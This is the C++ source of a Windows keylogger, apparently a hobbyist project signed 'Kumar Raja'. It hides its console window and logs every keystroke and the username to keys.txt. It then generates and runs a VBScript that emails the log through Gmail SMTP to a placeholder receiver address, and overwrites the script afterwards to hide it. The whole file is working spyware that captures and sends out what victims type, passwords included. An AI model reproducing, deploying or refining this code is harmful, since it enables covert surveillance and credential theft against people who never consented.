/*
 █ █/ █ ___ _   _█ █      __   __ _  ___ _ __ 
 █ ' / / █ \ █ █ █ █   / _ \ / _` █/ █ \ '__█
 █ . \ █ █_/ █_█ █ █__| (█) █ (_█ █  █_/ █   
 █_█\_█\___█\__, █____█\___/ \__, █\___█_█   
            █___/            █___/           ------ Kumar Raja
 * */

#include <Windows.h>
#include <iostream>
#include <fstream>
#include <stdio.h>
#include <string>
#include <unistd.h>
#include <Lmcons.h>
#include <time.h>
using namespace std;

void WriteToLog(LPCSTR text) {
	ofstream logfile;
	logfile.open("keys.txt", fstream::app);
	logfile << text;
	logfile.close();
}

void SendMail(){
    if (system("ping www.google.com -t 2 > nul") == 1) {
    char the_path[256];
    getcwd(the_path, 255);
    string SMTP_SERVER("smtp.gmail.com");
    string SMTP_USER("user@gmail.com");
    string SMTP_PASS("UserPassword");
    string SMTP_PORT("465");
    string SMTP_FROM("Hackumar");
    string SMTP_SUBJECT("KeyLogData");
    string SMTP_TO("RecieverMailID@gmail.com");
    string SMTP_BODY("This is Final Phase");
    string SMTP_FILE("keys.txt");
    ofstream logfile;
	logfile.open("k.vbs", fstream::out);
	logfile << "Set MyEmail=CreateObject(\"CDO.Message\")\nConst cdoBasic=0\nConst cdoAuth=1\nMyEmail.From    = \""<< SMTP_FROM <<"<"<<SMTP_USER<<">\"\nMyEmail.Subject=\""<<SMTP_SUBJECT<<"\"\nMyEmail.To=\"<"<<SMTP_TO<<">\"\nMyEmail.TextBody=\""<<SMTP_BODY<<"\"\nMyEmail.AddAttachment \""<<the_path<<"\\"<<SMTP_FILE<<"\"\nMyEmail.Configuration.Fields.Item (\"http://schemas.microsoft.com/cdo/configuration/sendusing\")=2\nMyEmail.Configuration.Fields.Item (\"http://schemas.microsoft.com/cdo/configuration/smtpserver\")=\""<<SMTP_SERVER<<"\"\nMyEmail.Configuration.Fields.Item (\"http://schemas.microsoft.com/cdo/configuration/smtpserverport\")=465\nMyEmail.Configuration.Fields.Item (\"http://schemas.microsoft.com/cdo/configuration/smtpauthenticate\")=1\nMyEmail.Configuration.Fields.Item (\"http://schemas.microsoft.com/cdo/configuration/sendusername\")= \""<<SMTP_USER<<"\"\nMyEmail.Configuration.Fields.Item (\"http://schemas.microsoft.com/cdo/configuration/sendpassword\")=\""<<SMTP_PASS<<"\"\nMyEmail.Configuration.Fields.Item (\"http://schemas.microsoft.com/cdo/configuration/smtpusessl\")=True\nMyEmail.Configuration.Fields.Update\nMyEmail.Send\nSet MyEmail=nothing" ;
	logfile.close();
    system("k.vbs");
    Sleep(5);
    logfile.open("k.vbs", fstream::out);
    logfile << "Nothing Here";
    logfile.close();
    //system("taskkill /IM KeyLogger.exe");
    }
}

bool isCapsLock(){
    if ((GetKeyState(VK_CAPITAL) & 0x0001)!=0)
        return true;
     else
        return false;    
}
bool isShift(){
    if ((GetKeyState( VK_SHIFT ) & 0x8000) != 0)
        return true;
     else
        return false;    
}

bool KeyIsListed(int iKey)  {
	switch (iKey)
	{
	case VK_SPACE:
		if (isShift()==TRUE) {WriteToLog("[Shift + Space] " );} else { WriteToLog(" [Space] ") ;}
		break;
	case VK_RETURN:
		if (isShift()==TRUE) {WriteToLog(" [Shift + Enter]\n " );} else { WriteToLog(" [Enter]\n ") ;}
		break;
	case VK_BACK:
		if (isShift()==TRUE) {WriteToLog(" [Shift + BackSpace] " );} else { WriteToLog(" [BackSpace] ") ;}
		break;
	case VK_RBUTTON:
		if (isShift()==TRUE) {WriteToLog(" [Shift + RightClick] " );} else { WriteToLog(" [RightClick] ") ;}
		break;
	case VK_LBUTTON:
		if (isShift()==TRUE) {WriteToLog(" [Shift + LeftClick] " );} else { WriteToLog(" [LeftClick] ") ;}
		break;
    case VK_TAB:
    if (isShift()==TRUE) {WriteToLog(" [Shift + TAB] " );} else { WriteToLog(" [TAB] ") ;}
        break;
    case VK_CONTROL:
    if (isShift()==TRUE) {WriteToLog(" [Shift + Control] " );} else { WriteToLog(" [Control] ") ;}
        break;
    case VK_MENU:
    if (isShift()==TRUE) {WriteToLog(" [Shift + Alt] " );} else { WriteToLog(" [Alt] ") ;}
        break;
    case VK_ESCAPE:
    if (isShift()==TRUE) {WriteToLog(" [Shift + Escape] " );} else { WriteToLog(" [Escape] ") ;}
        break;
    case VK_PRIOR:
    if (isShift()==TRUE) {WriteToLog(" [Shift + PageUP] " );} else { WriteToLog(" [PageUP] ") ;}
        break;
case VK_NEXT:
    if (isShift()==TRUE) {WriteToLog(" [Shift + PageDown] " );} else { WriteToLog(" [PageDown] ") ;}
        break;
case VK_END:
    if (isShift()==TRUE) {WriteToLog(" [Shift + END] " );} else { WriteToLog(" [END] ") ;}
        break;
case VK_HOME:
    if (isShift()==TRUE) {WriteToLog(" [Shift + HOME] " );} else { WriteToLog(" [HOME] ") ;}
        break;
case VK_LEFT:
    if (isShift()==TRUE) {WriteToLog(" [Shift + Left Arrow] " );} else { WriteToLog(" [Left Arrow] ") ;}
        break;
case VK_UP:
    if (isShift()==TRUE) {WriteToLog(" [Shift + UP Arrow] " );} else { WriteToLog(" [UP Arrow] ") ;}
        break;
case VK_DOWN:
    if (isShift()==TRUE) {WriteToLog(" [Shift + Down Arrow] " );} else { WriteToLog(" [Down Arrow] ") ;}
        break;
case VK_RIGHT:
    if (isShift()==TRUE) {WriteToLog(" [Shift + Right Arrow] " );} else { WriteToLog(" [Right Arrow] ") ;}
        break;	
case VK_SNAPSHOT:
    if (isShift()==TRUE) {WriteToLog(" [Shift + PRINT SCREEN] " );} else { WriteToLog(" [PRINT SCREEN] ") ;}
        break;
case VK_DELETE:
    if (isShift()==TRUE) {WriteToLog(" [Shift + Delete] " );} else { WriteToLog(" [Delete] ") ;}
        break;
case VK_LWIN:
case VK_RWIN:
    if (isShift()==TRUE) {WriteToLog(" [Shift + Windows] " );} else { WriteToLog(" [Windows] ") ;}
        break;
case VK_NUMPAD0:
    if (isShift()==TRUE) {WriteToLog(" [Shift + NUM0] " );} else { WriteToLog(" 0 ") ;}
        break;
case VK_NUMPAD1:
    if (isShift()==TRUE) {WriteToLog(" [Shift + NUM1] " );} else { WriteToLog(" 1 ") ;}
        break;
case VK_NUMPAD2:
    if (isShift()==TRUE) {WriteToLog(" [Shift + NUM2] " );} else { WriteToLog(" 2 ") ;}
        break;
case VK_NUMPAD3:
    if (isShift()==TRUE) {WriteToLog(" [Shift + NUM3] " );} else { WriteToLog(" 3 ") ;}
        break;
case VK_NUMPAD4:
    if (isShift()==TRUE) {WriteToLog(" [Shift + NUM4] " );} else { WriteToLog(" 4 ") ;}
        break;
case VK_NUMPAD5:
    if (isShift()==TRUE) {WriteToLog(" [Shift + NUM5] " );} else { WriteToLog(" 5 ") ;}
        break;
case VK_NUMPAD6:
    if (isShift()==TRUE) {WriteToLog(" [Shift + NUM6] " );} else { WriteToLog(" 6 ") ;}
        break;
case VK_NUMPAD7:
    if (isShift()==TRUE) {WriteToLog(" [Shift + NUM7] " );} else { WriteToLog(" 7 ") ;}
        break;
case VK_NUMPAD8:
    if (isShift()==TRUE) {WriteToLog(" [Shift + NUM8] " );} else { WriteToLog(" 8 ") ;}
        break;
case VK_NUMPAD9:
    if (isShift()==TRUE) {WriteToLog(" [Shift + NUM9] " );} else { WriteToLog(" 9 ") ;}
        break;
case VK_MULTIPLY:
    if (isShift()==TRUE) {WriteToLog(" [Shift + *] " );} else { WriteToLog(" * ") ;}
        break;
case VK_ADD:
    if (isShift()==TRUE) {WriteToLog(" [Shift + +] " );} else { WriteToLog(" + ") ;}
        break;
case VK_SUBTRACT:
    if (isShift()==TRUE) {WriteToLog(" [Shift + -] " );} else { WriteToLog(" - ") ;}
        break;
case VK_DECIMAL:
    if (isShift()==TRUE) {WriteToLog(" [Shift + .] " );} else { WriteToLog(" . ") ;}
        break;
case VK_DIVIDE:
    if (isShift()==TRUE) {WriteToLog(" [Shift + /] " );} else { WriteToLog(" / ") ;}
        break;
        
	default: return false;
	}
    return false;
}


char ShiftReturn(char key)
{
    int Mykey=int (key);
    if(key>='A' && key<='Z') 
    {
        if ( (isShift()==TRUE && isCapsLock()==FALSE) || (isShift()==FALSE && isCapsLock()==TRUE) ) { return key; }
        if ( (isShift()==TRUE && isCapsLock()==TRUE) || (isShift()==FALSE && isCapsLock()==FALSE) ) { key=key+32; return key ; }
    }
    else if (isShift()==TRUE && Mykey=='1') {return '!' ;}
    else if (isShift()==TRUE && Mykey=='2') {return '@' ;}
    else if (isShift()==TRUE && Mykey=='3') {return '#' ;}
    else if (isShift()==TRUE && Mykey=='4') {return '$' ;}
    else if (isShift()==TRUE && Mykey=='5') {return '%' ;}
    else if (isShift()==TRUE && Mykey=='6') {return '^' ;}
    else if (isShift()==TRUE && Mykey=='7') {return '&' ;}
    else if (isShift()==TRUE && Mykey=='8') {return '*' ;}
    else if (isShift()==TRUE && Mykey=='9') {return '(' ;}
    else if (isShift()==TRUE && Mykey=='0') {return ')' ;}
    if (key>='0' && key<='9') { 
     return key;   
    }
        
    return 0 ;
}
int main()
{
	char key;
    int a=0;
    int b=0;
    ShowWindow( GetConsoleWindow(), 0);
    char the_path[256];
    getcwd(the_path, 255);
    char username[UNLEN+1];
    DWORD username_len = UNLEN+1;
    GetUserName(username, &username_len);
    ofstream logfile;
    logfile.open("keys.txt", fstream::app);
    logfile << "\n" << username << "::: " << __TIMESTAMP__ << "\n";
    logfile.close();
    time_t theTime = time(NULL);
    struct tm *aTime = localtime(&theTime);
    int hour=aTime->tm_hour;
    int hoursend=0;
	while (true)
	{
		Sleep(10);
		for (key = 8; key <= 190; key++) {
			if (GetAsyncKeyState(key) == -32767) {
				if (KeyIsListed(key) == FALSE) {
                    int mykey=int(key);
                    if (mykey == '1'){a++;}
                    if (mykey == '4' && a==1){b++;}
                    if (mykey == '3' && a==1 && b==1){a++;b++;}
                    if (mykey == '8' && a==2 && b==2){a++;b++;}
                    char kum=ShiftReturn(key);
                    if (a==3 && b==3){ SendMail(); exit(0); }
                    if (hoursend==0 && hour%2==0) { SendMail();hoursend++; }
                    if (hoursend==1 && hour%2!=0) { SendMail();hoursend--; } 
					ofstream logfile;
					logfile.open("keys.txt", fstream::app);
					logfile << kum;
					logfile.close();
				}
			}
            
		}
	}
	return 0;
}
